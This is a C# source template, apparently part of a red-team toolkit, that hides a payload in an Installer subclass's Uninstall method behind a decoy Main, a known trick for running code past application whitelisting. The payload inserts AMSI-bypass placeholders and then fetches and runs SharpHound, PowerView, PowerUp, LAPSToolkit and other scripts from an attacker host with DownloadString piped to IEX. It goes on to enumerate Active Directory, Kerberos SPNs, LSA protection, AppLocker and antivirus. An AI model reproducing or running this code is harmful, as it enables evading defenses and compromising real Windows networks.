using System;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
using System.Threading;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
	    	String initialRecon = "systeminfo | Out-File -FilePath $LOCAL_RECON_DATA_DIR\\systeminfo.txt";
            String blCmd = "(New-Object System.Net.WebClient).DownloadString('http://${LHOST}:${LHOST_WEB_PORT}/SharpHound.ps1') | IEX; Invoke-Bloodhound -CollectionMethod All -OutputDirectory $LOCAL_RECON_DATA_DIR | Out-File -FilePath $LOCAL_RECON_DATA_DIR\\bh.txt";
            String lapsCmd = "(New-Object System.Net.WebClient).DownloadString('http://${LHOST}:${LHOST_WEB_PORT}/LAPSToolkit.ps1') | IEX; Get-LAPSComputers; Find-LAPSDelegatedGroups; Get-LAPSComputers | Out-File -FilePath $LOCAL_RECON_DATA_DIR\\LAPS.txt";
            String powerUp = "(New-Object System.Net.WebClient).DownloadString('http://${LHOST}:${LHOST_WEB_PORT}/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath $LOCAL_RECON_DATA_DIR\\PUp.txt";
            String sqlCheck = "setspn -Q MSSQLSvc/* | Out-File -FilePath $LOCAL_RECON_DATA_DIR\\sql_servers.txt";
            String spnsCmd = "setspn -Q */* | Out-File -FilePath $LOCAL_RECON_DATA_DIR\\spns.txt";
            String spnPsh = "(New-Object System.Net.WebClient).DownloadString('http://${LHOST}:${LHOST_WEB_PORT}/GetUserSPNs.ps1') | IEX | Out-File -FilePath $LOCAL_RECON_DATA_DIR\\PS_SPNs.txt";
		    String forestRelationships = "([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() | Out-File -FilePath $LOCAL_RECON_DATA_DIR\\forest.txt";
		    String hostRecon = "(New-Object System.Net.WebClient).DownloadString('http://${LHOST}:${LHOST_WEB_PORT}/HostRecon.ps1') | IEX; Invoke-HostRecon | Out-File -FilePath $LOCAL_RECON_DATA_DIR\\host_recon.txt";
		    String lsaProtect = "Get-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name RunAsPPL | Out-File -FilePath $LOCAL_RECON_DATA_DIR\\lsa_protection.txt";
		    String applocker = "Get-ChildItem -Path HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2\\Exe | Out-File -FilePath $LOCAL_RECON_DATA_DIR\\applocker.txt";
		    String powerViewLoader = "(New-Object System.Net.WebClient).DownloadString('http://${LHOST}:${LHOST_WEB_PORT}/PowerView.ps1') | IEX";
			String getUnconstrained = "Get-DomainComputer -Unconstrained | Out-File -FilePath $LOCAL_RECON_DATA_DIR\\unconstrained.txt";
			String getConstrained = "Get-DomainUser -TrustedToAuth | Out-File -FilePath $LOCAL_RECON_DATA_DIR\\constrained.txt";
			String wmicAvEnum = "wmic /namespace:\\\\root\SecurityCenter2 path AntiVirusProduct get * /value | Out-File -FilePath $LOCAL_RECON_DATA_DIR\\wmicAvEnum.txt";

			Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
          
            ps.AddScript(initialRecon);
            ps.Invoke();
       
            $WIN10_11_AMSI_BYPASS

            String path = "$LOCAL_RECON_DATA_DIR\\systeminfo.txt";

	    	int count = 0;
            while(!File.Exists(path) && count < 100){
            	Thread.Sleep(250);
            	count++;
            }

            if (File.Exists(path))
            {
            	string readText = File.ReadAllText(path);
            	if(readText.Contains("Microsoft Windows Server")){
            		Console.WriteLine("Detected Windows Server, using pre-Win 11 AMSI");
            		$WINSERVER_AMSI_BYPASS
            	}
            }else{
            	Console.WriteLine("Unable to determine OS version");
            }
            $AMSI_BYPASS_INVOKE
            ps.AddScript(blCmd);
            ps.AddScript(lapsCmd);
            ps.AddScript(powerUp);
            ps.AddScript(sqlCheck);
            ps.AddScript(spnsCmd);
            ps.AddScript(spnPsh);
            ps.AddScript(forestRelationships);
            ps.AddScript(hostRecon);
            ps.AddScript(lsaProtect);
            ps.AddScript(applocker);
            ps.AddScript(powerViewLoader);
            ps.AddScript(getUnconstrained);
            ps.AddScript(getConstrained);
            ps.AddScript(wmicAvEnum);
            ps.Invoke();
            rs.Close();
        }
    }
}